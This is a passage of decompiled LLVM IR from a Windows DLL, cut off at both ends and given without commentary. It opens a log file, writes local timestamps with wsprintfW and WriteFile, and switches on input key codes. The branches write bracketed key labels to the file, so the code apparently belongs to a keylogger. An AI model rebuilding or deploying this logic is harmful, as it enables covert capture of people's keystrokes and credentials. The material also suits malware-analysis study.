  %110 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !928
  %111 = ptrtoint i32* %110 to i32, !insn.addr !928
  store i32 %111, i32* @global_var_1003d9c0, align 4, !insn.addr !929
  store i32 %108, i32* %esp.2.reg2mem, !insn.addr !929
  br label %dec_label_pc_10002b08, !insn.addr !929

dec_label_pc_10002b08:                            ; preds = %dec_label_pc_10002af4, %dec_label_pc_10002ac3
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %112 = add i32 %esp.2.reload, -4, !insn.addr !930
  %113 = inttoptr i32 %112 to i32*, !insn.addr !930
  store i32 ptrtoint (i16* @global_var_1003ff38 to i32), i32* %113, align 4, !insn.addr !930
  call void @GetLocalTime(%_SYSTEMTIME* bitcast (i32* @4 to %_SYSTEMTIME*)), !insn.addr !931
  %114 = load i16, i16* @global_var_1003ff44, align 2, !insn.addr !932
  %115 = zext i16 %114 to i32, !insn.addr !932
  %116 = add i32 %esp.2.reload, -8, !insn.addr !933
  %117 = inttoptr i32 %116 to i32*, !insn.addr !933
  store i32 ptrtoint (i16** @global_var_1003f530 to i32), i32* %117, align 4, !insn.addr !933
  %118 = add i32 %esp.2.reload, -12, !insn.addr !934
  %119 = inttoptr i32 %118 to i32*, !insn.addr !934
  store i32 %115, i32* %119, align 4, !insn.addr !934
  %120 = load i16, i16* @global_var_1003ff42, align 2, !insn.addr !935
  %121 = zext i16 %120 to i32, !insn.addr !935
  %122 = add i32 %esp.2.reload, -16, !insn.addr !936
  %123 = inttoptr i32 %122 to i32*, !insn.addr !936
  store i32 %121, i32* %123, align 4, !insn.addr !936
  %124 = load i16, i16* @global_var_1003ff40, align 2, !insn.addr !937
  %125 = zext i16 %124 to i32, !insn.addr !937
  %126 = add i32 %esp.2.reload, -20, !insn.addr !938
  %127 = inttoptr i32 %126 to i32*, !insn.addr !938
  store i32 %125, i32* %127, align 4, !insn.addr !938
  %128 = load i16, i16* @global_var_1003ff3e, align 2, !insn.addr !939
  %129 = zext i16 %128 to i32, !insn.addr !939
  %130 = add i32 %esp.2.reload, -24, !insn.addr !940
  %131 = inttoptr i32 %130 to i32*, !insn.addr !940
  store i32 %129, i32* %131, align 4, !insn.addr !940
  %132 = load i16, i16* @global_var_1003ff3a, align 2, !insn.addr !941
  %133 = zext i16 %132 to i32, !insn.addr !941
  %134 = add i32 %esp.2.reload, -28, !insn.addr !942
  %135 = inttoptr i32 %134 to i32*, !insn.addr !942
  store i32 %133, i32* %135, align 4, !insn.addr !942
  %136 = load i16, i16* @global_var_1003ff38, align 2, !insn.addr !943
  %137 = zext i16 %136 to i32, !insn.addr !943
  %138 = add i32 %esp.2.reload, -32, !insn.addr !944
  %139 = inttoptr i32 %138 to i32*, !insn.addr !944
  store i32 %137, i32* %139, align 4, !insn.addr !944
  %140 = add i32 %esp.2.reload, -36, !insn.addr !945
  %141 = inttoptr i32 %140 to i32*, !insn.addr !945
  store i32 ptrtoint ([40 x i16]* @global_var_100381f8 to i32), i32* %141, align 4, !insn.addr !945
  %142 = add i32 %esp.2.reload, -40, !insn.addr !946
  %143 = inttoptr i32 %142 to i32*, !insn.addr !946
  store i32 ptrtoint (i16** @global_var_1003ed28 to i32), i32* %143, align 4, !insn.addr !946
  %144 = call i32 (i16*, i16*, ...) @wsprintfW(i16* bitcast (i32* @4 to i16*), i16* bitcast (i32* @4 to i16*)), !insn.addr !947
  store i32 ptrtoint (i16** @global_var_1003ed28 to i32), i32* %eax.2.reg2mem, !insn.addr !948
  br label %dec_label_pc_10002b63, !insn.addr !948

dec_label_pc_10002b63:                            ; preds = %dec_label_pc_10002b63, %dec_label_pc_10002b08
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %145 = inttoptr i32 %eax.2.reload to i16*, !insn.addr !949
  %146 = load i16, i16* %145, align 2, !insn.addr !949
  %147 = add i32 %eax.2.reload, 2, !insn.addr !950
  %148 = icmp eq i16 %146, 0, !insn.addr !951
  %149 = icmp eq i1 %148, false, !insn.addr !952
  store i32 %147, i32* %eax.2.reg2mem, !insn.addr !952
  br i1 %149, label %dec_label_pc_10002b63, label %dec_label_pc_10002b6e, !insn.addr !952

dec_label_pc_10002b6e:                            ; preds = %dec_label_pc_10002b63
  %150 = sub i32 %147, ptrtoint (i32* @global_var_1003ed2a to i32), !insn.addr !953
  store i32 0, i32* %117, align 4, !insn.addr !954
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %119, align 4, !insn.addr !955
  store i32 %150, i32* %123, align 4, !insn.addr !956
  store i32 ptrtoint (i16** @global_var_1003ed28 to i32), i32* %127, align 4, !insn.addr !957
  %151 = load i32, i32* @global_var_1003d9c0, align 4, !insn.addr !958
  store i32 %151, i32* %131, align 4, !insn.addr !958
  %152 = call i1 @WriteFile(i32* nonnull @4, i32* nonnull @4, i32 ptrtoint (i32* @4 to i32), i32* nonnull @4, %_OVERLAPPED* bitcast (i32* @4 to %_OVERLAPPED*)), !insn.addr !959
  store i32 0, i32* %ecx.3.reg2mem, !insn.addr !960
  br label %dec_label_pc_10002b90, !insn.addr !960

dec_label_pc_10002b90:                            ; preds = %dec_label_pc_10002b90, %dec_label_pc_10002b6e
  %ecx.3.reload = load i32, i32* %ecx.3.reg2mem
  %153 = add i32 %ecx.3.reload, ptrtoint (i16** @global_var_1003f530 to i32), !insn.addr !961
  %154 = inttoptr i32 %153 to i16*, !insn.addr !961
  %155 = load i16, i16* %154, align 2, !insn.addr !961
  %156 = add i32 %ecx.3.reload, 2, !insn.addr !962
  %157 = add i32 %ecx.3.reload, 268697672, !insn.addr !963
  %158 = inttoptr i32 %157 to i16*, !insn.addr !963
  store i16 %155, i16* %158, align 2, !insn.addr !963
  %159 = icmp eq i16 %155, 0, !insn.addr !964
  %160 = icmp eq i1 %159, false, !insn.addr !965
  store i32 %156, i32* %ecx.3.reg2mem, !insn.addr !965
  br i1 %160, label %dec_label_pc_10002b90, label %dec_label_pc_10002ba6, !insn.addr !965

dec_label_pc_10002ba6:                            ; preds = %dec_label_pc_10002b90
  %161 = load i32, i32* @global_var_1003d9c0, align 4, !insn.addr !966
  store i32 %161, i32* %135, align 4, !insn.addr !966
  %162 = call i1 @CloseHandle(i32* nonnull @4), !insn.addr !967
  store i32 %134, i32* %esp.3.reg2mem, !insn.addr !967
  br label %dec_label_pc_10002bae, !insn.addr !967

dec_label_pc_10002bae:                            ; preds = %dec_label_pc_10002a88, %dec_label_pc_10002a97, %dec_label_pc_10002ba6, %dec_label_pc_10002a49
  %esp.3.reload = load i32, i32* %esp.3.reg2mem
  %163 = ptrtoint i16* %stack_var_-216.0.reload to i32
  store i32 %163, i32* @3, align 4, !insn.addr !968
  %164 = trunc i32 %163 to i16, !insn.addr !969
  %.off = add i16 %164, -39
  %165 = icmp ult i16 %.off, 52
  br i1 %165, label %dec_label_pc_1000344f, label %dec_label_pc_10002bc4, !insn.addr !969

dec_label_pc_10002bc4:                            ; preds = %dec_label_pc_10002bae
  store i32 %163, i32* %.pre-phi.reg2mem, !insn.addr !970
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !970
  switch i32 %163, label %dec_label_pc_1000342f [
    i32 0, label %dec_label_pc_10002fe9
    i32 1, label %dec_label_pc_10002c5d
    i32 2, label %dec_label_pc_10002efe
    i32 3, label %dec_label_pc_10002c5d
    i32 4, label %dec_label_pc_10002efe
    i32 5, label %dec_label_pc_10002c5d
    i32 6, label %dec_label_pc_10002cb6
    i32 10, label %dec_label_pc_10002c12
    i32 14, label %dec_label_pc_10002d0b
    i32 15, label %dec_label_pc_100033c3
    i32 17, label %dec_label_pc_10003161
    i32 29, label %dec_label_pc_10002be3
    i32 30, label %dec_label_pc_100031ba
    i32 31, label %dec_label_pc_1000320c
    i32 32, label %dec_label_pc_10003266
    i32 33, label %dec_label_pc_100032bb
    i32 43, label %dec_label_pc_10002d66
    i32 88, label %dec_label_pc_10003316
    i32 89, label %dec_label_pc_1000336b
    i32 93, label %dec_label_pc_10002ea0
    i32 94, label %dec_label_pc_10002ecf
    i32 95, label %dec_label_pc_10002efe
    i32 96, label %dec_label_pc_10002f2d
    i32 97, label %dec_label_pc_10002f5c
    i32 98, label %dec_label_pc_10002f8b
    i32 99, label %dec_label_pc_10002fba
    i32 100, label %dec_label_pc_10002fe9
    i32 101, label %dec_label_pc_10003018
    i32 102, label %dec_label_pc_10003047
    i32 103, label %dec_label_pc_10003076
    i32 104, label %dec_label_pc_100030a5
    i32 106, label %dec_label_pc_100030d4
    i32 107, label %dec_label_pc_10003103
    i32 108, label %dec_label_pc_10003132
    i32 183, label %dec_label_pc_10002dbb
    i32 184, label %dec_label_pc_10002e24
    i32 185, label %dec_label_pc_10002e53
    i32 186, label %dec_label_pc_10002e62
    i32 187, label %dec_label_pc_10002e91
    i32 188, label %dec_label_pc_10002dca
    i32 189, label %dec_label_pc_10002dd9
  ], !insn.addr !970

dec_label_pc_10002be3:                            ; preds = %dec_label_pc_10002bc4
  %166 = add i32 %esp.3.reload, -4, !insn.addr !971
  %167 = inttoptr i32 %166 to i32*, !insn.addr !971
  store i32 0, i32* %167, align 4, !insn.addr !971
  %168 = add i32 %esp.3.reload, -8, !insn.addr !972
  %169 = inttoptr i32 %168 to i32*, !insn.addr !972
  store i32 128, i32* %169, align 4, !insn.addr !972
  %170 = add i32 %esp.3.reload, -12, !insn.addr !973
  %171 = inttoptr i32 %170 to i32*, !insn.addr !973
  store i32 4, i32* %171, align 4, !insn.addr !973
  %172 = add i32 %esp.3.reload, -16, !insn.addr !974
  %173 = inttoptr i32 %172 to i32*, !insn.addr !974
  store i32 0, i32* %173, align 4, !insn.addr !974
  %174 = add i32 %esp.3.reload, -20, !insn.addr !975
  %175 = inttoptr i32 %174 to i32*, !insn.addr !975
  store i32 1, i32* %175, align 4, !insn.addr !975
  %176 = add i32 %esp.3.reload, -24, !insn.addr !976
  %177 = inttoptr i32 %176 to i32*, !insn.addr !976
  store i32 4, i32* %177, align 4, !insn.addr !976
  %178 = add i32 %esp.3.reload, -28, !insn.addr !977
  %179 = inttoptr i32 %178 to i32*, !insn.addr !977
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %179, align 4, !insn.addr !977
  %180 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !978
  %181 = ptrtoint i32* %180 to i32, !insn.addr !978
  %182 = add i32 %esp.3.reload, -32, !insn.addr !979
  %183 = inttoptr i32 %182 to i32*, !insn.addr !979
  store i32 0, i32* %183, align 4, !insn.addr !979
  %184 = add i32 %esp.3.reload, -36, !insn.addr !980
  %185 = inttoptr i32 %184 to i32*, !insn.addr !980
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %185, align 4, !insn.addr !980
  %186 = add i32 %esp.3.reload, -40, !insn.addr !981
  %187 = inttoptr i32 %186 to i32*, !insn.addr !981
  store i32 2, i32* %187, align 4, !insn.addr !981
  %188 = add i32 %esp.3.reload, -44, !insn.addr !982
  %189 = inttoptr i32 %188 to i32*, !insn.addr !982
  store i32 ptrtoint (i32* @global_var_100381f4 to i32), i32* %189, align 4, !insn.addr !982
  store i32 %181, i32* @global_var_1003d9c0, align 4, !insn.addr !983
  %190 = add i32 %esp.3.reload, -48, !insn.addr !984
  %191 = inttoptr i32 %190 to i32*, !insn.addr !984
  store i32 %181, i32* %191, align 4, !insn.addr !984
  store i32 %190, i32* %esp.5.reg2mem, !insn.addr !985
  br label %dec_label_pc_10003425, !insn.addr !985

dec_label_pc_10002c12:                            ; preds = %dec_label_pc_10002bc4
  %192 = call i128 @__asm_movaps(i128 7368318247016640781110928015451), !insn.addr !986
  %193 = add i32 %esp.3.reload, -4, !insn.addr !987
  %194 = inttoptr i32 %193 to i32*, !insn.addr !987
  store i32 0, i32* %194, align 4, !insn.addr !987
  %195 = add i32 %esp.3.reload, -8, !insn.addr !988
  %196 = inttoptr i32 %195 to i32*, !insn.addr !988
  store i32 128, i32* %196, align 4, !insn.addr !988
  %197 = add i32 %esp.3.reload, -12, !insn.addr !989
  %198 = inttoptr i32 %197 to i32*, !insn.addr !989
  store i32 4, i32* %198, align 4, !insn.addr !989
  %199 = add i32 %esp.3.reload, -16, !insn.addr !990
  %200 = inttoptr i32 %199 to i32*, !insn.addr !990
  store i32 0, i32* %200, align 4, !insn.addr !990
  %201 = add i32 %esp.3.reload, -20, !insn.addr !991
  %202 = inttoptr i32 %201 to i32*, !insn.addr !991
  store i32 1, i32* %202, align 4, !insn.addr !991
  %203 = add i32 %esp.3.reload, -24, !insn.addr !992
  %204 = inttoptr i32 %203 to i32*, !insn.addr !992
  store i32 4, i32* %204, align 4, !insn.addr !992
  %205 = add i32 %esp.3.reload, -28, !insn.addr !993
  %206 = inttoptr i32 %205 to i32*, !insn.addr !993
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %206, align 4, !insn.addr !993
  %207 = load i128, i128* %stack_var_-108, align 8, !insn.addr !994
  call void @__asm_movups(i128 %207, i128 %192), !insn.addr !994
  %208 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !995
  %209 = ptrtoint i32* %208 to i32, !insn.addr !995
  store i32 %209, i32* @global_var_1003d9c0, align 4, !insn.addr !996
  store i32 %33, i32* %ecx.4.reg2mem, !insn.addr !997
  br label %dec_label_pc_10002c47, !insn.addr !997

dec_label_pc_10002c47:                            ; preds = %dec_label_pc_10002c47, %dec_label_pc_10002c12
  %ecx.4.reload = load i32, i32* %ecx.4.reg2mem
  %210 = inttoptr i32 %ecx.4.reload to i16*, !insn.addr !998
  %211 = load i16, i16* %210, align 2, !insn.addr !998
  %212 = add i32 %ecx.4.reload, 2, !insn.addr !999
  %213 = icmp eq i16 %211, 0, !insn.addr !1000
  %214 = icmp eq i1 %213, false, !insn.addr !1001
  store i32 %212, i32* %ecx.4.reg2mem, !insn.addr !1001
  store i32 %212, i32* %.pn.reg2mem, !insn.addr !1001
  store i32 %209, i32* %edx.6.reg2mem, !insn.addr !1001
  store i32 %205, i32* %esp.4.reg2mem, !insn.addr !1001
  br i1 %214, label %dec_label_pc_10002c47, label %dec_label_pc_10003413, !insn.addr !1001

dec_label_pc_10002c5d:                            ; preds = %dec_label_pc_10002bc4, %dec_label_pc_10002bc4, %dec_label_pc_10002bc4
  %215 = call i128 @__asm_movaps(i128 %38), !insn.addr !1002
  %216 = add i32 %esp.3.reload, -4, !insn.addr !1003
  %217 = inttoptr i32 %216 to i32*, !insn.addr !1003
  store i32 0, i32* %217, align 4, !insn.addr !1003
  %218 = add i32 %esp.3.reload, -8, !insn.addr !1004
  %219 = inttoptr i32 %218 to i32*, !insn.addr !1004
  store i32 128, i32* %219, align 4, !insn.addr !1004
  %220 = add i32 %esp.3.reload, -12, !insn.addr !1005
  %221 = inttoptr i32 %220 to i32*, !insn.addr !1005
  store i32 4, i32* %221, align 4, !insn.addr !1005
  %222 = add i32 %esp.3.reload, -16, !insn.addr !1006
  %223 = inttoptr i32 %222 to i32*, !insn.addr !1006
  store i32 0, i32* %223, align 4, !insn.addr !1006
  %224 = add i32 %esp.3.reload, -20, !insn.addr !1007
  %225 = inttoptr i32 %224 to i32*, !insn.addr !1007
  store i32 1, i32* %225, align 4, !insn.addr !1007
  %226 = add i32 %esp.3.reload, -24, !insn.addr !1008
  %227 = inttoptr i32 %226 to i32*, !insn.addr !1008
  store i32 4, i32* %227, align 4, !insn.addr !1008
  %228 = add i32 %esp.3.reload, -28, !insn.addr !1009
  %229 = inttoptr i32 %228 to i32*, !insn.addr !1009
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %229, align 4, !insn.addr !1009
  %230 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1010
  call void @__asm_movups(i128 %230, i128 %215), !insn.addr !1010
  %231 = call i32* @CreateFileW(i16* inttoptr (i32 4522051 to i16*), i32 93, i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1011
  %232 = ptrtoint i32* %231 to i32, !insn.addr !1011
  store i32 %232, i32* @global_var_1003d9c0, align 4, !insn.addr !1012
  store i32 %33, i32* %ecx.5.reg2mem, !insn.addr !1013
  br label %dec_label_pc_10002ca0, !insn.addr !1013

dec_label_pc_10002ca0:                            ; preds = %dec_label_pc_10002ca0, %dec_label_pc_10002c5d
  %ecx.5.reload = load i32, i32* %ecx.5.reg2mem
  %233 = inttoptr i32 %ecx.5.reload to i16*, !insn.addr !1014
  %234 = load i16, i16* %233, align 2, !insn.addr !1014
  %235 = add i32 %ecx.5.reload, 2, !insn.addr !1015
  %236 = icmp eq i16 %234, 0, !insn.addr !1016
  %237 = icmp eq i1 %236, false, !insn.addr !1017
  store i32 %235, i32* %ecx.5.reg2mem, !insn.addr !1017
  store i32 %235, i32* %.pn.reg2mem, !insn.addr !1017
  store i32 %232, i32* %edx.6.reg2mem, !insn.addr !1017
  store i32 %228, i32* %esp.4.reg2mem, !insn.addr !1017
  br i1 %237, label %dec_label_pc_10002ca0, label %dec_label_pc_10003413, !insn.addr !1017

dec_label_pc_10002cb6:                            ; preds = %dec_label_pc_10002bc4
  %238 = add i32 %esp.3.reload, -4, !insn.addr !1018
  %239 = inttoptr i32 %238 to i32*, !insn.addr !1018
  store i32 0, i32* %239, align 4, !insn.addr !1018
  %240 = add i32 %esp.3.reload, -8, !insn.addr !1019
  %241 = inttoptr i32 %240 to i32*, !insn.addr !1019
  store i32 128, i32* %241, align 4, !insn.addr !1019
  %242 = add i32 %esp.3.reload, -12, !insn.addr !1020
  %243 = inttoptr i32 %242 to i32*, !insn.addr !1020
  store i32 4, i32* %243, align 4, !insn.addr !1020
  %244 = add i32 %esp.3.reload, -16, !insn.addr !1021
  %245 = inttoptr i32 %244 to i32*, !insn.addr !1021
  store i32 0, i32* %245, align 4, !insn.addr !1021
  %246 = add i32 %esp.3.reload, -20, !insn.addr !1022
  %247 = inttoptr i32 %246 to i32*, !insn.addr !1022
  store i32 1, i32* %247, align 4, !insn.addr !1022
  %248 = add i32 %esp.3.reload, -24, !insn.addr !1023
  %249 = inttoptr i32 %248 to i32*, !insn.addr !1023
  store i32 4, i32* %249, align 4, !insn.addr !1023
  %250 = add i32 %esp.3.reload, -28, !insn.addr !1024
  %251 = inttoptr i32 %250 to i32*, !insn.addr !1024
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %251, align 4, !insn.addr !1024
  store i128 5505115, i128* %stack_var_-108, align 8, !insn.addr !1025
  %252 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1026
  %253 = ptrtoint i32* %252 to i32, !insn.addr !1026
  store i32 %253, i32* @global_var_1003d9c0, align 4, !insn.addr !1027
  store i32 %33, i32* %ecx.6.reg2mem, !insn.addr !1028
  br label %dec_label_pc_10002cf5, !insn.addr !1028

dec_label_pc_10002cf5:                            ; preds = %dec_label_pc_10002cf5, %dec_label_pc_10002cb6
  %ecx.6.reload = load i32, i32* %ecx.6.reg2mem
  %254 = inttoptr i32 %ecx.6.reload to i16*, !insn.addr !1029
  %255 = load i16, i16* %254, align 2, !insn.addr !1029
  %256 = add i32 %ecx.6.reload, 2, !insn.addr !1030
  %257 = icmp eq i16 %255, 0, !insn.addr !1031
  %258 = icmp eq i1 %257, false, !insn.addr !1032
  store i32 %256, i32* %ecx.6.reg2mem, !insn.addr !1032
  store i32 %256, i32* %.pn.reg2mem, !insn.addr !1032
  store i32 %253, i32* %edx.6.reg2mem, !insn.addr !1032
  store i32 %250, i32* %esp.4.reg2mem, !insn.addr !1032
  br i1 %258, label %dec_label_pc_10002cf5, label %dec_label_pc_10003413, !insn.addr !1032

dec_label_pc_10002d0b:                            ; preds = %dec_label_pc_10002bc4
  %259 = add i32 %esp.3.reload, -4, !insn.addr !1033
  %260 = inttoptr i32 %259 to i32*, !insn.addr !1033
  store i32 0, i32* %260, align 4, !insn.addr !1033
  %261 = add i32 %esp.3.reload, -8, !insn.addr !1034
  %262 = inttoptr i32 %261 to i32*, !insn.addr !1034
  store i32 128, i32* %262, align 4, !insn.addr !1034
  %263 = add i32 %esp.3.reload, -12, !insn.addr !1035
  %264 = inttoptr i32 %263 to i32*, !insn.addr !1035
  store i32 4, i32* %264, align 4, !insn.addr !1035
  %265 = add i32 %esp.3.reload, -16, !insn.addr !1036
  %266 = inttoptr i32 %265 to i32*, !insn.addr !1036
  store i32 0, i32* %266, align 4, !insn.addr !1036
  %267 = add i32 %esp.3.reload, -20, !insn.addr !1037
  %268 = inttoptr i32 %267 to i32*, !insn.addr !1037
  store i32 1, i32* %268, align 4, !insn.addr !1037
  %269 = add i32 %esp.3.reload, -24, !insn.addr !1038
  %270 = inttoptr i32 %269 to i32*, !insn.addr !1038
  store i32 4, i32* %270, align 4, !insn.addr !1038
  %271 = add i32 %esp.3.reload, -28, !insn.addr !1039
  %272 = inttoptr i32 %271 to i32*, !insn.addr !1039
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %272, align 4, !insn.addr !1039
  store i128 4391003, i128* %stack_var_-108, align 8, !insn.addr !1040
  %273 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1041
  %274 = ptrtoint i32* %273 to i32, !insn.addr !1041
  store i32 %274, i32* @global_var_1003d9c0, align 4, !insn.addr !1042
  store i32 %33, i32* %ecx.7.reg2mem, !insn.addr !1043
  br label %dec_label_pc_10002d50, !insn.addr !1043

dec_label_pc_10002d50:                            ; preds = %dec_label_pc_10002d50, %dec_label_pc_10002d0b
  %ecx.7.reload = load i32, i32* %ecx.7.reg2mem
  %275 = inttoptr i32 %ecx.7.reload to i16*, !insn.addr !1044
  %276 = load i16, i16* %275, align 2, !insn.addr !1044
  %277 = add i32 %ecx.7.reload, 2, !insn.addr !1045
  %278 = icmp eq i16 %276, 0, !insn.addr !1046
  %279 = icmp eq i1 %278, false, !insn.addr !1047
  store i32 %277, i32* %ecx.7.reg2mem, !insn.addr !1047
  store i32 %277, i32* %.pn.reg2mem, !insn.addr !1047
  store i32 %274, i32* %edx.6.reg2mem, !insn.addr !1047
  store i32 %271, i32* %esp.4.reg2mem, !insn.addr !1047
  br i1 %279, label %dec_label_pc_10002d50, label %dec_label_pc_10003413, !insn.addr !1047

dec_label_pc_10002d66:                            ; preds = %dec_label_pc_10002bc4
  %280 = add i32 %esp.3.reload, -4, !insn.addr !1048
  %281 = inttoptr i32 %280 to i32*, !insn.addr !1048
  store i32 0, i32* %281, align 4, !insn.addr !1048
  %282 = add i32 %esp.3.reload, -8, !insn.addr !1049
  %283 = inttoptr i32 %282 to i32*, !insn.addr !1049
  store i32 128, i32* %283, align 4, !insn.addr !1049
  %284 = add i32 %esp.3.reload, -12, !insn.addr !1050
  %285 = inttoptr i32 %284 to i32*, !insn.addr !1050
  store i32 4, i32* %285, align 4, !insn.addr !1050
  %286 = add i32 %esp.3.reload, -16, !insn.addr !1051
  %287 = inttoptr i32 %286 to i32*, !insn.addr !1051
  store i32 0, i32* %287, align 4, !insn.addr !1051
  %288 = add i32 %esp.3.reload, -20, !insn.addr !1052
  %289 = inttoptr i32 %288 to i32*, !insn.addr !1052
  store i32 1, i32* %289, align 4, !insn.addr !1052
  %290 = add i32 %esp.3.reload, -24, !insn.addr !1053
  %291 = inttoptr i32 %290 to i32*, !insn.addr !1053
  store i32 4, i32* %291, align 4, !insn.addr !1053
  %292 = add i32 %esp.3.reload, -28, !insn.addr !1054
  %293 = inttoptr i32 %292 to i32*, !insn.addr !1054
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %293, align 4, !insn.addr !1054
  store i128 4456539, i128* %stack_var_-108, align 8, !insn.addr !1055
  %294 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1056
  %295 = ptrtoint i32* %294 to i32, !insn.addr !1056
  store i32 %295, i32* @global_var_1003d9c0, align 4, !insn.addr !1057
  store i32 %33, i32* %ecx.8.reg2mem, !insn.addr !1058
  br label %dec_label_pc_10002da5, !insn.addr !1058

dec_label_pc_10002da5:                            ; preds = %dec_label_pc_10002da5, %dec_label_pc_10002d66
  %ecx.8.reload = load i32, i32* %ecx.8.reg2mem
  %296 = inttoptr i32 %ecx.8.reload to i16*, !insn.addr !1059
  %297 = load i16, i16* %296, align 2, !insn.addr !1059
  %298 = add i32 %ecx.8.reload, 2, !insn.addr !1060
  %299 = icmp eq i16 %297, 0, !insn.addr !1061
  %300 = icmp eq i1 %299, false, !insn.addr !1062
  store i32 %298, i32* %ecx.8.reg2mem, !insn.addr !1062
  store i32 %298, i32* %.pn.reg2mem, !insn.addr !1062
  store i32 %295, i32* %edx.6.reg2mem, !insn.addr !1062
  store i32 %292, i32* %esp.4.reg2mem, !insn.addr !1062
  br i1 %300, label %dec_label_pc_10002da5, label %dec_label_pc_10003413, !insn.addr !1062

dec_label_pc_10002dbb:                            ; preds = %dec_label_pc_10002bc4
  %301 = call i32 @function_10002600(), !insn.addr !1063
  store i32 183, i32* %.pre-phi.reg2mem, !insn.addr !1064
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1064
  br label %dec_label_pc_1000342f, !insn.addr !1064

dec_label_pc_10002dca:                            ; preds = %dec_label_pc_10002bc4
  %302 = call i32 @function_10002600(), !insn.addr !1065
  store i32 188, i32* %.pre-phi.reg2mem, !insn.addr !1066
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1066
  br label %dec_label_pc_1000342f, !insn.addr !1066

dec_label_pc_10002dd9:                            ; preds = %dec_label_pc_10002bc4
  %303 = call i32 @function_10002600(), !insn.addr !1067
  store i32 189, i32* %.pre-phi.reg2mem, !insn.addr !1068
  store i32 %esp.3.reload, i32* %esp.6.reg2mem, !insn.addr !1068
  br label %dec_label_pc_1000342f, !insn.addr !1068

dec_label_pc_10002e24:                            ; preds = %dec_label_pc_10002bc4
  %304 = add i32 %esp.3.reload, -4, !insn.addr !1069
  %305 = inttoptr i32 %304 to i32*, !insn.addr !1069
  store i32 0, i32* %305, align 4, !insn.addr !1069
  %306 = add i32 %esp.3.reload, -8, !insn.addr !1070
  %307 = inttoptr i32 %306 to i32*, !insn.addr !1070
  store i32 128, i32* %307, align 4, !insn.addr !1070
  %308 = add i32 %esp.3.reload, -12, !insn.addr !1071
  %309 = inttoptr i32 %308 to i32*, !insn.addr !1071
  store i32 4, i32* %309, align 4, !insn.addr !1071
  %310 = add i32 %esp.3.reload, -16, !insn.addr !1072
  %311 = inttoptr i32 %310 to i32*, !insn.addr !1072
  store i32 0, i32* %311, align 4, !insn.addr !1072
  %312 = add i32 %esp.3.reload, -20, !insn.addr !1073
  %313 = inttoptr i32 %312 to i32*, !insn.addr !1073
  store i32 1, i32* %313, align 4, !insn.addr !1073
  %314 = add i32 %esp.3.reload, -24, !insn.addr !1074
  %315 = inttoptr i32 %314 to i32*, !insn.addr !1074
  store i32 4, i32* %315, align 4, !insn.addr !1074
  %316 = add i32 %esp.3.reload, -28, !insn.addr !1075
  %317 = inttoptr i32 %316 to i32*, !insn.addr !1075
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %317, align 4, !insn.addr !1075
  %318 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1076
  %319 = ptrtoint i32* %318 to i32, !insn.addr !1076
  %320 = add i32 %esp.3.reload, -32, !insn.addr !1077
  %321 = inttoptr i32 %320 to i32*, !insn.addr !1077
  store i32 0, i32* %321, align 4, !insn.addr !1077
  %322 = add i32 %esp.3.reload, -36, !insn.addr !1078
  %323 = inttoptr i32 %322 to i32*, !insn.addr !1078
